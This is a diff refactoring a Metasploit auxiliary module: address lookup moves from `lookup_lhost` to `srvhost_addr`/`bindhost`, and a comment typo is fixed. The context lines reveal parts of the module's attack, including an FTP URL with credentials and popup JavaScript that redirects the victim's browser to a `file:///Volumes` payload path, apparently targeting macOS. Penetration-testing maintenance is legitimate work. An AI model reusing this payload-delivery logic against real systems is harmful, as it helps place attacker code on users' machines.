@@ -46,15 +46,6 @@ class MetasploitModule < Msf::Auxiliary
     ])
   end
 
-  def lookup_lhost(c = nil)
-    # Get the source address
-    if datastore['SRVHOST'] == '0.0.0.0'
-      Rex::Socket.source_address(c || '50.50.50.50')
-    else
-      datastore['SRVHOST']
-    end
-  end
-
   def on_request_uri(cli, req)
     if req.method =~ /post/i
       data_str = req.body.to_s
@@ -97,7 +88,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def ftp_url
-    "ftp://#{ftp_user}:#{ftp_pass}@#{lookup_lhost}:#{datastore['SRVPORT']}"
+    "ftp://#{ftp_user}:#{ftp_pass}@#{srvhost_addr}:#{datastore['SRVPORT']}"
   end
 
   def popup_html
@@ -124,7 +115,7 @@ class MetasploitModule < Msf::Auxiliary
         function() {
           history.pushState.call(
             opener.history, {}, {},
-            'file:///Volumes/#{lookup_lhost}/#{payload_name}'
+            'file:///Volumes/#{srvhost_addr}/#{payload_name}'
           );
         },
         function() { opener.location = 'about:blank'; },
@@ -219,19 +210,14 @@ class MetasploitModule < Msf::Auxiliary
   # msf/core/exploit/http/server.rb
   #
   def start_http(opts = {})
-    # Ensture all dependencies are present before initializing HTTP
+    # Ensure all dependencies are present before initializing HTTP
     use_zlib
 
-    comm = datastore['ListenerComm']
-    if (comm.to_s == "local")
-      comm = ::Rex::Socket::Comm::Local
-    else
-      comm = nil
-    end
+    comm = _determine_server_comm(bindhost)
 
     # Default the server host / port
     opts = {
-      'ServerHost' => datastore['SRVHOST'],
+      'ServerHost' => bindhost,
       'ServerPort' => datastore['HTTPPORT'],
       'Comm' => comm
     }.update(opts)
